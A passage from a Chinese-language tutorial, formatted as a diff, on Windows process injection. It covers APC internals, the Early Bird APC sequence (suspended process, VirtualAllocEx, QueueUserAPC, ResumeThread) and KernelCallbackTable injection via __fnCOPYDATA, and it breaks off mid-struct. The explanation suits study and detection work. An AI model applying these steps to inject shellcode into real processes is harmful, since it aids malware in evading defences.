@@ -1,0 +1,169 @@
+Windows下关于进程的注入方法有很多  
+有几种通用性较强像APC注入和KernelCallbackTable注入。这里结合了实际参考了github代码和一些优化的项目来将其实现，然后更好的理解学习一下这两种注入的方式和它们的可操作性。
+**APC Code Injection**  
+首先来介绍一下APC APC注入 和实现的过程中一些细节的地方，比如枚举线程，用户态内核态APC的区别等这样方便更好的理解APC
+注入的实现原理和后续改进等。  
+Windows内核态使用APC来完成异步启动的I/O操作，线程挂起等行为  
+APC是（Asynchronous Procedure Call）指异步过程调用  
+APC是允许用户程序和系统组件在特定线程的上下文中执行代码，因此会在特定进程的地址空间内执行代码,与APC注入有关的DLL主要有两个：Kernel32.dll和Ntdll.dll  
+有关的函数主要有如下这几个
+    CreateToolhelp32Snapshot，Process32First，Process32Next，Thread32First，Thread32Next，OpenProcess，OpenThread，DuplicateHandle，GetCurrentProcess，WriteProcessMemory，VirtualProtectEx，QueueUserAPC，ResumeThread，NtAllocateVirtualMemory
+以上的函数，在APC注入过程中都会使用到其中有几个在其他注入方法中可能不常见的函数，需要了解一下函数的作用。比如QueueUserAPC --将用户模式
+异步过程调用 (APC) 对象添加到指定线程的 APC 队列，ResumeThread --递减线程的挂起计数。 当暂停计数递减为零时，将恢复线程的执行
+* * *
+每个线程都有一个存储所有APC的队列，线程可以在进程内执行代码，线程可以利用APC队列异步执行代码
+* * *
+**插播**  
+APC 分为两种类型用户模式APC 和 内核模式APC  
+用户模式APC在目标线程的进程上下文中的用户空间执行，它要求目标线程处于可更改的等待状态，内核模式APC在内核空间执行
+此时又可以分为常规APC和特殊APC。  
+内核/用户 APC都具有三个功能：  
+● KernelRoutine：该函数将在内核空间中执行（如果是普通内核APC和用户APC，则IRQL= PASSIVE_LEVEL 如果是特殊内核APC
+则IRQL=APC_LEVEL，这样创建具有编号的线程来挂起系统上的所有其他 CPU，并且每个线程将 IRQL
+提升到DISPATCH_LEVEL，然后将当前处理器上的 IRQL 提升到DISPATCH_LEVEL，这样不会被 Windows
+内核或任何其他驱动程序打断，并且由于 APC 是在APC_LEVEL或PASSIVE_LEVEL分派的，APC 在 APC 枚举期间不会更改。）  
+● RundownRoutine：如果线程在到达APC之前中止，就会在内核空间中调用此函数  
+● NormalRoutine：如果是内核态APC 这个函数会在内核空间调用，如果是用户态APC则会在用户空间调用。  
+每个线程都在_KTHREAD数据结构中有两个_KAPC_STATE类型的成员，名为ApcState和SavedApcState  
+● ApcState： 无论线程是附加到自己的进程还是其他进程都在使用  
+● SavedApcState：用于存储不是当前上下文且必须等待的进程上下文的APC（列如：当线程附加到另一个进程时候，APC正在排队等待自己的进程）  
+_KAPC_STATE 结构有一个名为 ApcListHead 的成员，它是两个 LIST_ENTRY 结构，被视为内核 APC 和用户 APC
+的列表头，并将用于为线程排队 APC  
+Windbg内核调试即可获取到_KAPC_STATE
+    0: kd> dt nt!_KTHREAD
+       +0x000 Header           : _DISPATCHER_HEADER
+       +0x018 SListFaultAddress : Ptr64 Void
+    .......................................................
+       +0x098 ApcState         : _KAPC_STATE   
+       +0x098 ApcStateFill     : [43] UChar
+       +0x0c3 Priority         : Char
+       +0x0c4 UserIdealProcessor : Uint4B
+       +0x0c8 WaitStatus       : Int8B
+       +0x0d0 WaitBlockList    : Ptr64 _KWAIT_BLOCK
+       +0x0d8 WaitListEntry    : _LIST_ENTRY
+    .......................................................
+       +0x258 SavedApcState    : _KAPC_STATE
+       +0x258 SavedApcStateFill : [43] UChar
+       +0x283 WaitReason       : UChar
+       +0x284 SuspendCount     : Char
+       +0x285 Saturation       : Char
+    0: kd> dt nt!_KAPC_STATE
+       +0x000 ApcListHead      : [2] _LIST_ENTRY  ! 这里就是内核或者用户态 APC 的队列头
+       +0x020 Process          : Ptr64 _KPROCESS
+       +0x028 InProgressFlags  : UChar
+       +0x028 KernelApcInProgress : Pos 0, 1 Bit
+       +0x028 SpecialApcInProgress : Pos 1, 1 Bit
+       +0x029 KernelApcPending : UChar
+       +0x02a UserApcPendingAll : UChar
+       +0x02a SpecialUserApcPending : Pos 0, 1 Bit
+       +0x02a UserApcPending   : Pos 1, 1 Bit
+（线程在进程中执行代码 线程可以利用APC队列异步执行代码 每个线程都有一个存储所有apc的队列 应用程序可以将APC队列到给定的线程(取决于特权) ）  
+枚举：枚举进程中所有线程ID  
+现在已经知道了APC队列存在于进程内的线程中，所以就需要从_KPROCESS结构获取进程线程列表，然后再去线程上获取_KTHREAD结构，再从_KTHREAD结构获取
+_KAPC_STATE结构然后再去解析内核APC或者用户态APC。但是问题是不同windows版本的话，偏移是会变的如果搞错了就有可能导致BOSD！所以这个方法需要我们获取不同Windows版本的偏移值才行  
+我们也可以从用户模式进程中枚举线程ID  
+那我们就需要完成获取目标进程中的所有线程ID  
+两个方法  
+● ZwQuerySystemInformation
+并将SystemProcessInformation作为SystemInformationClass参数  
+● CreateToolhelp32Snaphot ->Thread32First ->Thread32Next  
+枚举线程ID代码（这里展示的CreateToolhelp32Snaphot方法）
+    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (hThreadSnap == INVALID_HANDLE_VALUE)
+            return(FALSE);
+        te32.dwSize = sizeof(THREADENTRY32);
+        if (!Thread32First(hThreadSnap, &te32)) {
+            //Error calling Thread32First
+            CloseHandle(hThreadSnap);
+            return(FALSE);
+        }
+        do
+        {
+            if (te32.th32OwnerProcessID == dwOwnerPID)
+            {
+                printf(TEXT("THREAD ID = 0x%08X"), te32.th32ThreadID);
+                printf(TEXT("base priority  = %d"), te32.tpBasePri);
+                printf(TEXT("delta priority = %d"), te32.tpDeltaPri);
+                Threadarray[counter]= te32.th32ThreadID;
+                counter++;
+            }
+        } while (Thread32Next(hThreadSnap, &te32));
+上述插播了一下关于APC在用户态和内核态的一些前置知识也说明了枚举线程过程中用到的结构等，然后来看一下具体实现APC注入的过程。  
+APC 注入的步骤（在完成一个标准的apc注入需要的过程）
+  * 首先确定并且找到你要注入的进程（PID）
+  * 在该进程的内存空间中分配出内存
+  * 将你准备的shellcode写入你分配出来的内存空间
+  * 然后查找遍历出进程中的所有线程（上述插播中介绍了枚举是如果实施的此处就好理解了）
+  * 将APC函数放入所有线程中的队列
+  * 最后APC函数指向放入的Shellcode（线程恢复并且执行Shellcode）  
+这里不要把进程和线程混淆  
+那么当进程中的线程被调用的时候，也代表我们放入线程队列里的APC函数也将被调用，此时Shellcode就会被执行  
+但是该方法有个缺陷恶意程序无法强制受害线程执行注入的代码。
+但是也能修复这个缺陷其方法名为Early Bird APC Queue Code Injection  
+Early Bird APC Queue Code Injection 它与传统的APC Code Injection 差别在其发生在进程初始化的阶段  
+也就是在挂起的状态下去创建新的合法进程
+    BOOL creationResult;
+        creationResult = CreateProcess(
+            NULL,                   // No module name (use command line)
+            cmdLine,                // Command line
+            NULL,                   // Process handle not inheritable
+            NULL,                   // Thread handle not inheritable
+            FALSE,                  // Set handle inheritance to FALSE
+            NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP, // creation flags
+            NULL,                   // Use parent's environment block
+            NULL,                   // Use parent's starting directory 
+            &startupInfo,           // Pointer to STARTUPINFO structure
+            &processInformation);   // Pointer to PROCESS_INFORMATION structure
+这样的话当我们进行APC注入的时候，线程是一直处于suspended状态的。  
+然后因为APC注入设计对存放数据内存区域的修改，所以需要修改保护属性，然后大致说一下保护属性的含义。  
+内存页面保护属性有
+PAGE_NOACCESS、PAGE_READONLY、PAGE_READWRITE、PAGE_EXECUTE、PAGE_EXECUTE_READ、PAGE_EXECUTE_READWRITE、PAGE_WRITECOPY、PAGE_EXECUTE_WRITECOPY。  
+一些恶意软件将代码写入到用于数据的内存区域（比如线程栈上），通过这种方式让应用程序执行恶意代码。windows数据执行保护特性提供了对此类恶意攻击的防护。如果启用了DEP，那么只有对那些真正需要执行的代码的内存区域，操作系统才page
+_execute_ *保护属性。其它保护属性（最常见的就是PAGE_READWRITE）用于只应该存放数据的内存区域。  
+最终核心的代码实现
+    CreateProcessA(NULL, (LPSTR)targetexe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)//用挂起模式创建目标进程
+    VirtualAllocEx(procInfo->hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)//在保护属性PAGE_READWRITE的远程进程中分配内存
+    VirtualProtectEx(procInfo->hProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)//将已分配内存的内存保护属性从PAGE_READWRITE更改为PAGE_EXECUTE_READ
+    设置程序(APC程序)
+    QueueUserAPC((PAPCFUNC)tRoutine, procInfo->hThread, 0)//把payload放入APC队列里
+    ResumeThread(procInfo->hThread)//恢复线程
+    这样最开始处于挂起状态创建的进程，就会开始执行触发APC函数
+成功完成注入  
+**KernelCallbackTable注入**  
+KernelCallbackTable 注入可以被用于在远程进程中注入shellcode，KernelCallbackTable
+可以在PEB中找到，它被KeUserModeCallback所使用，内核态调用KeUserModeCallback就可以在用户态中执行KernelCallbackTable中对应的函数。而且很多提权CVE的漏洞都有涉及到Hook
+KernelCallbackTable是windows中的回调过程。像CVE-2018-8453等，所以KernelCallbackTable是windows中一个比较重要的概念  
+大致注入过程为：使用VirtualAllocEx和WriteProcessMemory写入数据，使用NtQueryInformationProcess获取目标进程的PEB地址，并且读取查找内核回调表的位置，编写一个新的内核回调表，将fnCOPYDATA的地址修改为shellcode入口，在目标进程中获取对象拥有的窗口发送WM_COPYDATA消息来触发。  
+有关的函数主要有如下这几个
+    CreateProcess，WaitForInputIdle，FindWindow，GetWindowThreadProcessId，ReadProcessMemory，VirtualAllocEx，WriteProcessMemory，SendMessage，NtQueryInformationProcess
+KernelCallbackTable注入用于在注入后运行shellcode，有时在其他进程中，基本上使用KeUserModeCallback或KERNELCALLBACKTABLE结构中的__fnCOPYDATA
+KernelCallbackTable的结构体，在KernelCallbackTable注入中很重要，上述说的__fnCOPYDATA就在下列结构体中
+    typedef struct _KERNELCALLBACKTABLE_T {
+        ULONG_PTR __fnCOPYDATA;
+        ULONG_PTR __fnCOPYGLOBALDATA;
+        ULONG_PTR __fnDWORD;
+        ULONG_PTR __fnNCDESTROY;
+        ULONG_PTR __fnDWORDOPTINLPMSG;
+        ULONG_PTR __fnINOUTDRAG;
+        ULONG_PTR __fnGETTEXTLENGTHS;
+        ULONG_PTR __fnINCNTOUTSTRING;
+        ULONG_PTR __fnPOUTLPINT;
+        ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
+        ULONG_PTR __fnINLPCREATESTRUCT;
+        ULONG_PTR __fnINLPDELETEITEMSTRUCT;
+        ULONG_PTR __fnINLPDRAWITEMSTRUCT;
+        ULONG_PTR __fnPOPTINLPUINT;
+        ULONG_PTR __fnPOPTINLPUINT2;
+        ULONG_PTR __fnINLPMDICREATESTRUCT;
+        ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
+        ULONG_PTR __fnINLPWINDOWPOS;
+        ULONG_PTR __fnINOUTLPPOINT5;
+        ULONG_PTR __fnINOUTLPSCROLLINFO;
+        ULONG_PTR __fnINOUTLPRECT;
+        ULONG_PTR __fnINOUTNCCALCSIZE;
+        ULONG_PTR __fnINOUTLPPOINT5_;
+        ULONG_PTR __fnINPAINTCLIPBRD;
+        ULONG_PTR __fnINSIZECLIPBRD;
+        ULONG_PTR __fnINDESTROYCLIPBRD;
+        ULONG_PTR __fnINSTRING;
+        ULONG_PTR __fnINSTRINGNULL;
